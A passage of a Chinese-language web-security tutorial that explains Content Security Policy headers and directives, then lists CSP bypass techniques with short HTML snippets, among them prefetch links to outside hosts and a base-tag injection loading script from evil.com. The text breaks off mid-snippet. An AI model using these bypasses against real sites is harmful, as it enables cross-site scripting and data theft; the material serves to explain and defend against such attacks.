&lt;p&gt;阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守  &lt;code&gt;Content-Type&lt;/code&gt;  消息头。例如如果在 HTML 文档中指定  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标记，则浏览器会尝试将 HTML 解析为 JavaScript。&lt;/p&gt;
&lt;h1 id=&#34;csp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp&#34;&gt;#&lt;/a&gt; CSP&lt;/h1&gt;
&lt;h2 id=&#34;csp是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp是什么&#34;&gt;#&lt;/a&gt; CSP 是什么？&lt;/h2&gt;
&lt;p&gt;Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。&lt;/p&gt;
&lt;h2 id=&#34;配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置&#34;&gt;#&lt;/a&gt; 配置&lt;/h2&gt;
&lt;p&gt;CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。&lt;/p&gt;
&lt;p&gt;CSP 有三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Content-Security-Policy (Google Chrome)&lt;/li&gt;
&lt;li&gt;X-Content-Security-Policy (Firefox)&lt;/li&gt;
&lt;li&gt;X-WebKit-CSP (WebKit-based browsers, e.g. Safari)&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HTTP header :&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;Content-Security-Policy:&#34; 策略&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;Content-Security-Policy-Report-Only:&#34; 策略&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report-Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。&lt;/p&gt;
&lt;p&gt;HTML Meta :&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;content-security-policy&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;策略&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;content-security-policy-report-only&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;策略&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;指令说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#指令说明&#34;&gt;#&lt;/a&gt; 指令说明&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;default-src&lt;/td&gt;
&lt;td&gt;定义资源默认加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;connect-src&lt;/td&gt;
&lt;td&gt;定义 Ajax、WebSocket 等加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;font-src&lt;/td&gt;
&lt;td&gt;定义 Font 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;frame-src&lt;/td&gt;
&lt;td&gt;定义 Frame 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;img-src&lt;/td&gt;
&lt;td&gt;定义图片加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;media-src&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;audio&amp;gt;、&amp;lt;video&amp;gt; 等引用资源加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;object-src&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;applet&amp;gt;、&amp;lt;embed&amp;gt;、&amp;lt;object&amp;gt; 等引用资源加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;script-src&lt;/td&gt;
&lt;td&gt;定义 JS 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;style-src&lt;/td&gt;
&lt;td&gt;定义 CSS 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;base-uri&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;base&amp;gt; 根 URL 策略，不使用 default-src 作为默认值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sandbox&lt;/td&gt;
&lt;td&gt;值为 allow-forms，对资源启用 sandbox&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;report-uri&lt;/td&gt;
&lt;td&gt;值为 /report-uri，提交日志&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;关键字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字&#34;&gt;#&lt;/a&gt; 关键字&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许从任意 url 加载，除了  &lt;code&gt;data:&lt;/code&gt;   &lt;code&gt;blob:&lt;/code&gt;   &lt;code&gt;filesystem:&lt;/code&gt;   &lt;code&gt;schemes&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src -&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;none&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;禁止从任何 url 加载资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;object-src &#39;none&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;self&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;只可以加载同源资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src &#39;self&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data:&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;可以通过 data 协议加载资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src &#39;self&#39; data:&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;domain.example.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src domain.example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只可以从特定的域加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\*.example.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src \*.example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;可以从任意 example.com 的子域处加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://cdn.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src https://cdn.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只能从给定的域用 https 加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https:&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src https:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只能从任意域用 https 加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-inline&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;unsafe-inline&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-eval&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许一些不安全的代码执行方式，例如 js 的 eval ()&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;unsafe-eval&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nonce-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;使用随机的 nonce，允许加载标签上 nonce 属性匹配的标签&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;nonce-bm9uY2U=&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;hash-algo&amp;gt;-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许 hash 值匹配的代码块被执行&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;sha256-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;配置范例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置范例&#34;&gt;#&lt;/a&gt; 配置范例&lt;/h3&gt;
&lt;p&gt;允许执行内联 JS 代码，但不允许加载外部资源&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Security&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Policy&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;src &lt;span class=&#34;token string&#34;&gt;&#39;self&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; script&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;src &lt;span class=&#34;token string&#34;&gt;&#39;self&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;unsafe-inline&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h2&gt;
&lt;h3 id=&#34;预加载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预加载&#34;&gt;#&lt;/a&gt; 预加载&lt;/h3&gt;
&lt;p&gt;浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。&lt;/p&gt;
&lt;p&gt;HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 预加载某个页面 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- firefox --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prerender&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- chrome --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 预加载某个图片 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx/x.jpg&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- DNS 预解析 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;dns-prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 特定文件类型预加载 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;preload&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;//xxxxx/xx.js&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- chrome --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL 中包含下载资源&lt;/li&gt;
&lt;li&gt;页面中包含音频、视频&lt;/li&gt;
&lt;li&gt;POST、PUT 和 DELET 操作的 ajax 请求&lt;/li&gt;
&lt;li&gt;HTTP 认证&lt;/li&gt;
&lt;li&gt;HTTPS 页面&lt;/li&gt;
&lt;li&gt;含恶意软件的页面&lt;/li&gt;
&lt;li&gt;弹窗页面&lt;/li&gt;
&lt;li&gt;占用资源很多的页面&lt;/li&gt;
&lt;li&gt;打开了 chrome developer tools 开发工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mime-sniff&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mime-sniff&#34;&gt;#&lt;/a&gt; MIME Sniff&lt;/h3&gt;
&lt;p&gt;举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 &lt;code&gt;&amp;lt;script href=&#39;http://xxx.com/xx.jpg&#39;&amp;gt;&lt;/code&gt; ，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本&lt;/p&gt;
&lt;h3 id=&#34;302跳转&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#302跳转&#34;&gt;#&lt;/a&gt; 302 跳转&lt;/h3&gt;
&lt;p&gt;对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跳板必须在允许的域内。&lt;/li&gt;
&lt;li&gt;要加载的文件的 host 部分必须跟允许的域的 host 部分一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;iframe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iframe&#34;&gt;#&lt;/a&gt; iframe&lt;/h3&gt;
&lt;p&gt;当可以执行代码时，可以创建一个源为  &lt;code&gt;css&lt;/code&gt;   &lt;code&gt;js&lt;/code&gt;  等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用  &lt;code&gt;../../../&lt;/code&gt;   &lt;code&gt;/%2e%2e%2f&lt;/code&gt;  等可能触发服务器报错的链接也可以到达相应的目的。&lt;/p&gt;
&lt;h3 id=&#34;base-uri&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#base-uri&#34;&gt;#&lt;/a&gt; base-uri&lt;/h3&gt;
&lt;p&gt;当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过  &lt;code&gt;base&lt;/code&gt;  标签修改根 URL 来 bypass，如下加载了 http://evil.com/main.js&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;base&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://evil.com/&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;nonce&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;correct value&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;/main.js&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;location 绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可上传 SVG 时，通过恶意 SVG 绕过同源站点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Angular versions &amp;lt;1.5.9&amp;gt;=1.5.0，存在漏洞 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FuZ3VsYXIvYW5ndWxhci5qcy9wdWxsLzE1MzQ2&#34;&gt;Git Pull Request&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;jQuery sourcemap&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;document.write(`&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//@        